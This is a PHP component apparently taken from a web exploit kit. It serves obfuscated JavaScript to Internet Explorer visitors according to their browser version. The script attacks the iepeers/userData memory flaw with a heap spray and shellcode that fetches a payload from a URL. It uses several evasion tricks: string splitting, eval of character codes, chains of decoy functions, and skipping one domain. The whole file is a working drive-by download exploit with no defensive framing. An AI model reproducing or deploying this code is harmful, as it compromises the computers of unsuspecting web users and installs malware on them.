<?php 
include("CP-ENC-7531.php");
$user_agent = $_SERVER["HTTP_USER_AGENT"];
$browser = $cpFunctions->GetBrowser($user_agent);
$os = $cpFunctions->GetOS($user_agent);
$strUrl = $GLOBALS["cpXplHelper"]->GetURL("iepeers", $browser, $os, "iepeers");
$randomStrFunc = $GLOBALS["cpFunctions"]->CreateArrayString(8, "200");
$randomStr = $GLOBALS["cpFunctions"]->CreateArrayString(6, "100");
if( 6 < $cpFunctions->MSIEVersion($user_agent) ) 
{
    $xxxx = CPackExploitHelper::randfuncs($randomStrFunc, $randomStr[58], "");
    echo "<script language='Javascript'>";
    echo "document.write('<M" . $randomStr[8] . "A" . $randomStr[8] . "R" . $randomStr[8] . "QU" . $randomStr[8] . "E" . $randomStr[8] . "E " . $randomStr[8] . "i" . $randomStr[8] . "d" . $randomStr[8] . "=\"" . $randomStr[13] . "\" " . $randomStr[8] . "st" . $randomStr[8] . "y" . $randomStr[8] . "le" . $randomStr[8] . "=\"" . $randomStr[8] . "b" . $randomStr[8] . "eha" . $randomStr[8] . "v" . $randomStr[8] . "io" . $randomStr[8] . "r: " . $randomStr[8] . "u" . $randomStr[8] . "r" . $randomStr[8] . "l(" . $randomStr[8] . "#" . $randomStr[8] . "def" . $randomStr[8] . "ault" . $randomStr[8] . "#" . $randomStr[8] . "u" . $randomStr[8] . "ser" . $randomStr[8] . "Da" . $randomStr[8] . "ta);\"></M" . $randomStr[8] . "AR" . $randomStr[8] . "Q" . $randomStr[8] . "U" . $randomStr[8] . "E" . $randomStr[8] . "E>'.replace(/" . $randomStr[8] . "/g,''));";
    echo $xxxx;
    echo "\r\nfunction " . $randomStr[59] . "(){\r\n\tvar " . $randomStr[50] . " = \"" . $randomStr[15] . "0c0c" . $randomStr[15] . "0c0c\".replace(/" . $randomStr[15] . "/g,\"%u\").replace(/a/g,'c').replace(/9/g,'0');\r\n\tvar " . $randomStr[45] . " = \"" . $GLOBALS["cpXplHelper"]->GetJSShellcode($strUrl, $randomStr[41]) . "\".replace(/" . $randomStr[41] . "/g,\"Au\".replace(/A/g,\"B\").replace(/B/g,unescape(\"%25\")));\r\n\tvar " . $randomStr[7] . "= unescape(" . $randomStr[50] . ");\r\n\tvar " . $randomStr[6] . "= unescape(" . $randomStr[45] . ");\r\n " . $randomStr[8] . " = new Array();\r\n var " . $randomStr[9] . " = 0x86000-(" . $randomStr[6] . ".length*2);\r\n while(" . $randomStr[7] . ".length<" . $randomStr[9] . "/2) { " . $randomStr[7] . "+=" . $randomStr[7] . "; }\r\n var " . $randomStr[10] . " = " . $randomStr[7] . ".substring(0," . $randomStr[9] . "/2);\r\n delete " . $randomStr[7] . ";\r\n for(" . $randomStr[11] . "=0; " . $randomStr[11] . "<270; " . $randomStr[11] . "++) {\r\n  " . $randomStr[8] . "[" . $randomStr[11] . "] = " . $randomStr[10] . " + " . $randomStr[10] . " + " . $randomStr[6] . ";\r\n }\r\n}\r\nfunction " . $randomStr[40] . "(){\r\n\t\tvar " . $randomStr[9] . " = \"" . CPackExploitHelper::randoccurance($randomStr[15]) . "c" . CPackExploitHelper::randoccurance($randomStr[15]) . "s" . CPackExploitHelper::randoccurance($randomStr[15]) . "." . CPackExploitHelper::randoccurance($randomStr[15]) . "u" . CPackExploitHelper::randoccurance($randomStr[15]) . "c" . CPackExploitHelper::randoccurance($randomStr[15]) . "s" . CPackExploitHelper::randoccurance($randomStr[15]) . "b" . CPackExploitHelper::randoccurance($randomStr[15]) . "." . CPackExploitHelper::randoccurance($randomStr[15]) . "e" . CPackExploitHelper::randoccurance($randomStr[15]) . "d" . CPackExploitHelper::randoccurance($randomStr[15]) . "u\".replace(/" . $randomStr[15] . "/g,'');\r\n\t\tvar " . $randomStr[10] . " = window['" . $randomStr[15] . "l" . $randomStr[15] . "o" . $randomStr[15] . "cat" . $randomStr[15] . "i" . $randomStr[15] . "o" . $randomStr[15] . "n'.replace(/" . $randomStr[15] . "/g,'')].href;\r\n\t\tvar " . $randomStr[11] . " = " . $randomStr[10] . "['" . $randomStr[15] . "s" . $randomStr[15] . "e" . $randomStr[15] . "ar" . $randomStr[15] . "ch'.replace(/" . $randomStr[15] . "/g,'')](" . $randomStr[9] . ");\r\n\t\tif(" . $randomStr[11] . " != -1){\r\n\t\t\treturn 0;\r\n\t\t}else{\r\n\t\t\treturn 1;\r\n\t\t}\r\n}\r\nfunction " . $randomStr[58] . "() {\r\n " . $randomStr[59] . "();\r\n for (" . $randomStr[11] . " = 1; " . $randomStr[11] . " <10; " . $randomStr[11] . " ++ ){\r\n  " . $randomStr[13] . ".setAttribute(\"" . $randomStr[12] . "\",document.location);\r\n }\r\n " . $randomStr[13] . ".setAttribute(\"" . $randomStr[12] . "\",document.getElementsByName(\"style\"));\r\n document.location=\"about:\"+unescape(\"" . $randomStr[12] . "u0c0c" . $randomStr[12] . "u" . $randomStr[13] . "0" . $randomStr[13] . "c0" . $randomStr[13] . "c" . $randomStr[12] . "u" . $randomStr[13] . "0" . $randomStr[13] . "c" . $randomStr[13] . "0c" . $randomStr[12] . "u" . $randomStr[13] . "0" . $randomStr[13] . "c" . $randomStr[13] . "0" . $randomStr[13] . "c\".replace(/" . $randomStr[12] . "/g,'%').replace(/" . $randomStr[13] . "/g,''))+\"blank\";\r\n}\r\n\r\nif(" . $randomStr[40] . "()){\r\n\t" . $randomStrFunc[0] . "();\r\n}\r\n";
    echo "</script>";
}
else
{
    echo "<BUTTON ID='" . $randomStr[0] . "' ONCLICK='" . $randomStr[1] . "();'></BUTTON><script language='Javascript'>";
    echo CPackExploitHelper::randfuncs($randomStrFunc, $randomStr[3], "");
    $root = "\r\nvar " . $randomStr[9] . " = document;\r\nfunction " . $randomStr[1] . "()                                                  \r\n{                                                               \r\n\tvar " . $randomStr[2] . "=" . $randomStr[9] . "['" . $randomStr[9] . "c" . $randomStr[9] . "r" . $randomStr[9] . "e" . $randomStr[9] . "a" . $randomStr[9] . "t" . $randomStr[9] . "e" . $randomStr[9] . "E" . $randomStr[9] . "l" . $randomStr[9] . "e" . $randomStr[9] . "m" . $randomStr[9] . "e" . $randomStr[9] . "n" . $randomStr[9] . "t" . $randomStr[9] . "'.replace(/" . $randomStr[9] . "/g,'')]('DIV');                           \r\n\t" . $randomStr[2] . "['" . $randomStr[11] . "a" . $randomStr[11] . "d" . $randomStr[11] . "d" . $randomStr[11] . "B" . $randomStr[11] . "e" . $randomStr[11] . "h" . $randomStr[11] . "a" . $randomStr[11] . "v" . $randomStr[11] . "i" . $randomStr[11] . "o" . $randomStr[11] . "r" . $randomStr[11] . "'.replace(/" . $randomStr[11] . "/g,'')]('" . $randomStr[3] . "#" . $randomStr[3] . "d" . $randomStr[3] . "e" . $randomStr[3] . "f" . $randomStr[3] . "a" . $randomStr[3] . "u" . $randomStr[3] . "l" . $randomStr[3] . "t" . $randomStr[3] . "#" . $randomStr[3] . "u" . $randomStr[3] . "s" . $randomStr[3] . "e" . $randomStr[3] . "r" . $randomStr[3] . "D" . $randomStr[3] . "a" . $randomStr[3] . "t" . $randomStr[3] . "a" . $randomStr[3] . "'.replace(/" . $randomStr[3] . "/g,''));                            \r\n\tdocument['" . $randomStr[2] . "a" . $randomStr[2] . "p" . $randomStr[2] . "p" . $randomStr[2] . "e" . $randomStr[2] . "n" . $randomStr[2] . "d" . $randomStr[2] . "C" . $randomStr[2] . "h" . $randomStr[2] . "i" . $randomStr[2] . "l" . $randomStr[2] . "d" . $randomStr[2] . "'.replace(/" . $randomStr[2] . "/g,'')](" . $randomStr[2] . ");                                       \r\n\ttry{\r\n\t\tfor (i=0;i<10;i++){\r\n\t\t\t" . $randomStr[2] . "['" . $randomStr[2] . "s" . $randomStr[2] . "e" . $randomStr[2] . "t" . $randomStr[2] . "A" . $randomStr[2] . "t" . $randomStr[2] . "t" . $randomStr[2] . "r" . $randomStr[2] . "i" . $randomStr[2] . "b" . $randomStr[2] . "u" . $randomStr[2] . "t" . $randomStr[2] . "e" . $randomStr[2] . "'.replace(/" . $randomStr[2] . "/g,'')]('s',window);\r\n\t\t}\r\n\t} \r\n\tcatch(e){}\r\n\twindow['s" . $randomStr[2] . "t" . $randomStr[2] . "a" . $randomStr[2] . "t" . $randomStr[2] . "u" . $randomStr[2] . "s" . $randomStr[2] . "'.replace(/" . $randomStr[2] . "/g,'')] +='';                                             \r\n}\r\nfunction " . $randomStr[40] . "(){\r\n\t\tvar " . $randomStr[9] . " = \"" . CPackExploitHelper::randoccurance($randomStr[15]) . "c" . CPackExploitHelper::randoccurance($randomStr[15]) . "s" . CPackExploitHelper::randoccurance($randomStr[15]) . "." . CPackExploitHelper::randoccurance($randomStr[15]) . "u" . CPackExploitHelper::randoccurance($randomStr[15]) . "c" . CPackExploitHelper::randoccurance($randomStr[15]) . "s" . CPackExploitHelper::randoccurance($randomStr[15]) . "b" . CPackExploitHelper::randoccurance($randomStr[15]) . "." . CPackExploitHelper::randoccurance($randomStr[15]) . "e" . CPackExploitHelper::randoccurance($randomStr[15]) . "d" . CPackExploitHelper::randoccurance($randomStr[15]) . "u\".replace(/" . $randomStr[15] . "/g,'');\r\n\t\tvar " . $randomStr[10] . " = window['" . $randomStr[15] . "l" . $randomStr[15] . "o" . $randomStr[15] . "cat" . $randomStr[15] . "i" . $randomStr[15] . "o" . $randomStr[15] . "n'.replace(/" . $randomStr[15] . "/g,'')].href;\r\n\t\tvar " . $randomStr[11] . " = " . $randomStr[10] . "['" . $randomStr[15] . "s" . $randomStr[15] . "e" . $randomStr[15] . "ar" . $randomStr[15] . "ch'.replace(/" . $randomStr[15] . "/g,'')](" . $randomStr[9] . ");\r\n\t\tif(" . $randomStr[11] . " != -1){\r\n\t\t\treturn 0;\r\n\t\t}else{\r\n\t\t\treturn 1;\r\n\t\t}\r\n}";
    echo enc($root);
    echo "\r\nfunction " . $randomStr[3] . "(){\r\n\tif(" . $randomStr[40] . "()){\r\n\tvar " . $randomStr[4] . ";\r\n\tvar " . $randomStr[50] . " = \"" . $randomStr[15] . "9a9a" . $randomStr[15] . "9a9a\".replace(/" . $randomStr[15] . "/g,\"%u\").replace(/a/g,'c').replace(/9/g,'0');\r\n\tvar " . $randomStr[45] . " = \"" . $GLOBALS["cpXplHelper"]->GetJSShellcode($strUrl, $randomStr[41]) . "\".replace(/" . $randomStr[41] . "/g,\"Au\".replace(/A/g,\"B\").replace(/B/g,unescape(\"%25\")));\r\n\tvar " . $randomStr[7] . "= unescape(" . $randomStr[50] . ");\r\n\tvar " . $randomStr[6] . "= unescape(" . $randomStr[45] . ");";
    $root = "var " . $randomStr[8] . "=528384-" . $randomStr[6] . ".length*2;";
    echo $root;
    echo "\r\n\twhile(" . $randomStr[7] . ".length <= " . $randomStr[8] . ") " . $randomStr[7] . "+=" . $randomStr[7] . ";";
    $root = "\r\n\t" . $randomStr[7] . "=" . $randomStr[7] . ".substring(0," . $randomStr[8] . " - " . $randomStr[6] . ".length);\r\n\t";
    echo enc($root);
    echo "\r\n\t" . $randomStr[4] . "=new Array();                                             \r\n\tfor(i=0;i<0x100;i++){\r\n\t\t" . $randomStr[4] . "[i]=" . $randomStr[7] . " + " . $randomStr[6] . ";\r\n\t} \t\t\t\t\t\t\t\t\t\t\t\t\t\r\n\tCollectGarbage();                                               \r\n\tdocument.getElementById('" . $randomStr[0] . "').onclick();\r\n\t}\r\n}\r\nif(" . $randomStr[40] . "()){\r\n\t" . $randomStrFunc[0] . "();\r\n}";
    echo "</script>";
}

function randFuncs($randomStr, $in)
{
    $x = "";
    for( $i = 0; $i <= 150; $i++ ) 
    {
        $x .= "function " . $randomStr[$i] . "(){ " . $randomStr[$i + 1] . "(); }\n";
    }
    $x .= "function " . $randomStr[$i] . "(){ " . $in . "(); }\n";
    return $x;
}

function enc($string)
{
    $randomStr = $GLOBALS["cpFunctions"]->CreateArrayString(6, "100");
    $string = str_split($string);
    $content = "window['e" . $randomStr[1] . "v" . $randomStr[1] . "al'.replace(/" . $randomStr[1] . "/g,'')](String['f" . $randomStr[1] . "r" . $randomStr[1] . "o" . $randomStr[1] . "m" . $randomStr[1] . "C" . $randomStr[1] . "h" . $randomStr[1] . "a" . $randomStr[1] . "r" . $randomStr[1] . "C" . $randomStr[1] . "o" . $randomStr[1] . "d" . $randomStr[1] . "e'.replace(/" . $randomStr[1] . "/g,'')](";
    for( $i = 0; $i < count($string); $i++ ) 
    {
        $content .= ord($string[$i]) . ",";
    }
    $content = substr($content, 0, 0 - 1) . "));";
    return $content;
}


